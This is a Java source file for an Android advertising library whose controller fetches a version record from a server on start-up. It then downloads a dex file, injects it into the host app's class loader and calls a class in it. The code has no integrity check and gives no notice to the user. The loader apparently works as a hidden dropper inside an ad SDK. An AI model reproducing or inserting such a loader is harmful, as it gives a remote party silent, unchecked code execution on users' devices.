package com.xugu.qewadlib;


import org.json.JSONObject;


import android.content.Context;
import android.util.Log;


public class GAdController {
	private static GAdController controller;
	private Context context;
	private String newSdkCode;
	
	private GAdController()
	{
		
	}
	
	public static GAdController getInstance()
	{
		if(controller == null)
		{
			controller = new GAdController();					
		}	
		return controller;
	}
	
		
	public void init(Context context,Boolean isTestModel)
	{
		this.context = context;
		
		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTestModel);
		
		GTool.httpGetRequest(GCommons.URI_GET_NEW_SDK, this, "revNewSdk", null);				
	}
	
	public static void showSpotAd(Context context)
	{
		GTool.callSpot(context.getClassLoader(), context);
	}
	
	public Context getContext() {
		return context;
	}

	public void setContext(Context context) {
		this.context = context;
	}
	
	public void revNewSdk(Object ob,Object rev)
	{
		JSONObject obj = null;
		String versionCode = null;
		String downloadPath = null;
		
		try {
			 obj = new JSONObject(rev.toString());	
			 versionCode = obj.getString("versionCode");
			 downloadPath = obj.getString("downloadPath");
			 newSdkCode = versionCode;
		} catch (Exception e) {
		}	
		
		String code = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_SDK_VERSIONCODE, "0");
		Log.e("------------","----------curr sdk="+code);
		if(code.equals(versionCode))
		{
			Log.e("------------","----------startservice");
			String dexPath = GDexLoaderUtil.getDexPath(context, downloadPath);
			final String optimizedDexOutputPath = GDexLoaderUtil.getOptimizedDexPath(context);
	        GDexLoaderUtil.injectAboveEqualApiLevel14(dexPath, optimizedDexOutputPath, null, "com.qinglu.ad.QLAdController");
	        GDexLoaderUtil.call(context.getClassLoader(),context);
		}
		else
		{
			Log.e("------------","----------downloadRes");
			GTool.downloadRes(GCommons.SERVER_ADDRESS, this, "revNewSdkCallback", downloadPath, true);
		}
	}
	
	public void revNewSdkCallback(Object ob,Object rev)
	{
		GDexLoaderUtil.copyDex(context, ob.toString());
		String dexPath = GDexLoaderUtil.getDexPath(context, ob.toString());
		final String optimizedDexOutputPath = GDexLoaderUtil.getOptimizedDexPath(context);
        GDexLoaderUtil.injectAboveEqualApiLevel14(dexPath, optimizedDexOutputPath, null, "com.qinglu.ad.QLAdController");
        GTool.saveSharedData(GCommons.SHARED_KEY_SDK_VERSIONCODE,newSdkCode);
        GDexLoaderUtil.call(context.getClassLoader(),context);
       
        Log.e("------------","----------newSdkCode sdk="+newSdkCode);
	}
}
